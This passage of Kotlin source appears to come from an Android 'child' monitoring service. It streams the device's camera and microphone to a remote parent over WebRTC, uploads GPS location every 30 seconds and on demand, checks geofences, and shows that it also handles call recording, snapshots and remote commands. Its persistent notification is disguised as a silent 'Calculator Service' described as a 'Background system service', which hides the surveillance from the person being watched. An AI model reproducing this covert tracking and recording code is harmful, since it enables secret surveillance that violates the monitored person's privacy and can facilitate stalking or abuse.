                // Broadcaster MUST stay in MODE_NORMAL so local media playback (YouTube, music)
                // and loudspeaker are NEVER suppressed or redirected to earpiece
                audioManager?.mode = AudioManager.MODE_NORMAL
                audioManager?.isMicrophoneMute = false
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] AudioManager mode error: ${e.localizedMessage}")
            }

            webRtcManager = WebRtcManager(applicationContext)
            FirebaseRepository.fetchIceServers { iceServers ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Starting WebRTC stream ($streamType) with ${iceServers.size} ICE servers for session: $sessionId")

                webRtcManager?.startStream(
                    streamType = streamType,
                    iceServers = iceServers,
                    onIceCandidate = { candidate ->
                        val candMap = mapOf(
                            "sdpMid" to candidate.sdpMid,
                            "sdpMLineIndex" to candidate.sdpMLineIndex,
                            "sdp" to candidate.sdp
                        )
                        synchronized(candidateBuffer) {
                            candidateBuffer.add(candMap)
                        }
                        candidateHandler.removeCallbacksAndMessages(null)
                        candidateHandler.postDelayed({
                            val batch = synchronized(candidateBuffer) {
                                val list = candidateBuffer.toList()
                                candidateBuffer.clear()
                                list
                            }
                            if (batch.isNotEmpty()) {
                                FirebaseRepository.sendIceCandidatesBatch(sessionId, batch, isParent = false)
                            }
                        }, 500L)
                    },
                    onSdpCreated = { sdp ->
                        FirebaseCrashlytics.getInstance().log("[ChildService] Sending SDP Offer to RTDB")
                        FirebaseRepository.sendSdpOffer(sessionId, sdp.description)
                    }
            )

            // 1. Listen for SDP Answer from Parent
            sdpAnswerListener = FirebaseRepository.listenToSdpAnswer(sessionId) { sdpAnswer ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received SDP Answer from Parent")
                webRtcManager?.setRemoteAnswer(sdpAnswer)
            }

            // 2. Listen for Parent ICE candidates
            parentCandidateListener = FirebaseRepository.listenToCandidates(sessionId, listenToParentCandidates = true) { sdpMid, sdpMLineIndex, sdp ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received Parent ICE Candidate")
                webRtcManager?.addRemoteCandidate(sdpMid, sdpMLineIndex, sdp)
            }

            // 3. Listen for Camera Flip requests
            cameraFacingListener = FirebaseRepository.listenToCameraFacing(sessionId) { isFront ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Camera flip toggled: isFront=$isFront")
                webRtcManager?.switchCamera()
            }
            } // end fetchIceServers
        } catch (t: Throwable) {
            FirebaseCrashlytics.getInstance().recordException(t)
            AppHealthTelemetry.logDiagnostic(applicationContext, "WEBRTC_STREAM", "FAILED", "Failed to start WebRTC stream on child: ${t.localizedMessage}", t.message)
            stopStream()
        }
    }

    private fun stopStream() {
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        val oldSessionId = currentSessionId
        isStreaming = false
        currentSessionId = null

        if (!oldSessionId.isNullOrEmpty()) {
            sdpAnswerListener?.let {
                FirebaseRepository.removeSdpAnswerListener(oldSessionId, it)
            }
            parentCandidateListener?.let {
                FirebaseRepository.removeCandidateListener(oldSessionId, listenToParentCandidates = true, it)
            }
            cameraFacingListener?.let {
                FirebaseRepository.removeCameraFacingListener(oldSessionId, it)
            }
        }
        candidateHandler.removeCallbacksAndMessages(null)
        val remaining = synchronized(candidateBuffer) {
            val list = candidateBuffer.toList()
            candidateBuffer.clear()
            list
        }
        if (remaining.isNotEmpty() && !oldSessionId.isNullOrEmpty()) {
            FirebaseRepository.sendIceCandidatesBatch(oldSessionId, remaining, isParent = false)
        }

        sdpAnswerListener = null
        parentCandidateListener = null
        cameraFacingListener = null

        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] audioManager reset error: ${e.localizedMessage}")
        }
        try {
            webRtcManager?.stopStream()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        webRtcManager = null
        releaseWakeLock()
        removeOverlayWindow()
    }

    private fun startLocationMonitoring() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location permissions (FINE or COARSE) not granted on child device."
            )
            return
        }
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            locationListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isEmpty()) return
                    val userLoc = UserLocation(
                        latitude = loc.latitude,
                        longitude = loc.longitude,
                        accuracy = loc.accuracy,
                        timestamp = loc.time,
                        provider = loc.provider ?: "gps"
                    )
                    FirebaseRepository.updateChildLocation(uid, userLoc)
                    FirebaseRepository.recordLocationHistoryPoint(uid, userLoc)
                    com.example.authapp.utils.GeofenceUtils.checkGeofences(applicationContext, uid, userLoc, activeGeofences)
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }

            // Push last known location if available
            val lastGps = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val lastNet = locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            val bestLast = when {
                lastGps != null && lastNet != null -> if (lastGps.time > lastNet.time) lastGps else lastNet
                lastGps != null -> lastGps
                else -> lastNet
            }
            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            if (bestLast != null && uid.isNotEmpty()) {
                FirebaseRepository.updateChildLocation(
                    uid,
                    UserLocation(
                        latitude = bestLast.latitude,
                        longitude = bestLast.longitude,
                        accuracy = bestLast.accuracy,
                        timestamp = bestLast.time,
                        provider = bestLast.provider ?: "last_known"
                    )
                )
            }

            // Periodic updates (every 30s or 15 meters to minimize battery drain and RTDB cost)
            locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000L, 15f, locationListener!!)
            locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000L, 15f, locationListener!!)

            // Listen for on-demand "Refresh GPS" from Parent
            if (uid.isNotEmpty()) {
                locationRequestListener = FirebaseRepository.listenToLocationRequests(uid) {
                    fetchSingleLocationFix()
                }
            }
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "SUCCESS",
                "Location listener registered (GPS + Network)"
            )
        } catch (e: SecurityException) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location security exception: ${e.localizedMessage}",
                e.localizedMessage
            )
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "Location init error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun fetchSingleLocationFix() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "On-demand location refresh skipped: permission denied"
            )
            return
        }
        try {
            val lm = locationManager ?: (getSystemService(Context.LOCATION_SERVICE) as? LocationManager)
            var locationReceived = false
            val singleListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    if (locationReceived) return
                    locationReceived = true
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isNotEmpty()) {
                        FirebaseRepository.updateChildLocation(
                            uid,
                            UserLocation(
                                latitude = loc.latitude,
                                longitude = loc.longitude,
                                accuracy = loc.accuracy,
                                timestamp = loc.time,
                                provider = loc.provider ?: "gps_refresh"
                            )
                        )
                        AppHealthTelemetry.logDiagnostic(
                            applicationContext,
                            "LOCATION_TRACKING",
                            "SUCCESS",
                            "On-demand single GPS fix acquired (accuracy: ${loc.accuracy}m)"
                        )
                    }
                    try {
                        lm?.removeUpdates(this)
                    } catch (_: Exception) {}
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }
            lm?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, singleListener)
            lm?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, singleListener)

            // ✅ CRITICAL FIX: 15-second timeout — agar GPS indoor/off ho toh listener auto-remove ho jaye
            // Prevent stuck GPS listener causing continuous battery drain
            mainHandler.postDelayed({
                if (!locationReceived) {
                    try {
                        lm?.removeUpdates(singleListener)
                        AppHealthTelemetry.logDiagnostic(
                            applicationContext,
                            "LOCATION_TRACKING",
                            "TIMEOUT",
                            "On-demand GPS fix timed out after 15s (indoor or GPS disabled). Listener removed to prevent battery drain."
                        )
                    } catch (_: Exception) {}
                }
            }, 15_000L)
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "fetchSingleLocationFix error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Calculator Service",
                // ✅ FIX: LOW importance — no popup, no sound, just silent status bar icon
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(contentText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Calculator Service")
            .setContentText(contentText)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        heartbeatHandler?.removeCallbacksAndMessages(null)
        heartbeatHandler = null
        heartbeatRunnable = null
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        AppHealthTelemetry.syncDeviceHealth(applicationContext, "STOPPED")
        stopStream()
        try {
            callRecorder?.stopCallRecording()
            callRecorder = null
        } catch (_: Exception) {}
        try {
            streamAudioRecorder?.stopRecording()
            streamAudioRecorder = null
        } catch (_: Exception) {}
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
            audioManager?.isMicrophoneMute = false
        } catch (_: Exception) {}
        val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
        if (uid.isNotEmpty() && streamRequestListener != null) {
            FirebaseRepository.removeStreamRequestListener(uid, streamRequestListener!!)
            streamRequestListener = null
        }
        if (uid.isNotEmpty() && streamRecordingListener != null) {
            FirebaseRepository.removeValueListener("streams/$uid/recordCommand", streamRecordingListener!!)
            streamRecordingListener = null
        }
        if (uid.isNotEmpty()) {
            snapshotRequestListener?.let {
                FirebaseRepository.removeValueListener("users/$uid/snapshotRequest", it)
            }
            recordingScheduleListener?.let {
                FirebaseRepository.removeValueListener("schedules/$uid", it)
            }
            parentControlsListener?.let {
                FirebaseRepository.removeValueListener("parent_controls/$uid", it)
            }
            remoteCommandsListener?.let {
                FirebaseRepository.removeValueListener("commands/$uid", it)
            }
            geofencesListener?.let {
                FirebaseRepository.removeValueListener("geofences/$uid", it)
            }
        }
        snapshotRequestListener = null
        recordingScheduleListener = null
        parentControlsListener = null
        remoteCommandsListener = null
        geofencesListener = null
        RemoteActionsManager.stopSiren()
        RemoteActionsManager.setTorch(applicationContext, false)
        updateStudyModeOverlay(false, "")
        if (locationListener != null && locationManager != null) {
            try {
                locationManager?.removeUpdates(locationListener!!)
            } catch (_: Exception) {}
            locationListener = null
        }
        if (locationRequestListener != null) {
            if (uid.isNotEmpty()) {
                FirebaseRepository.removeValueListener("users/$uid/locationRequest", locationRequestListener!!)
            }
            locationRequestListener = null
        }
        releaseWakeLock()
        removeOverlayWindow()
        networkMonitor?.stopMonitoring()
        batteryReceiver?.let {
            try { unregisterReceiver(it) } catch (e: Exception) {}
        }
        super.onDestroy()
    }
}
